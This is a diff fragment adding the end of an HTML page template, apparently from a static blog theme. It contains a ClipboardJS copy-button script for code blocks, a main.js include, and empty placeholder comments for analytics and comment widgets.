+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
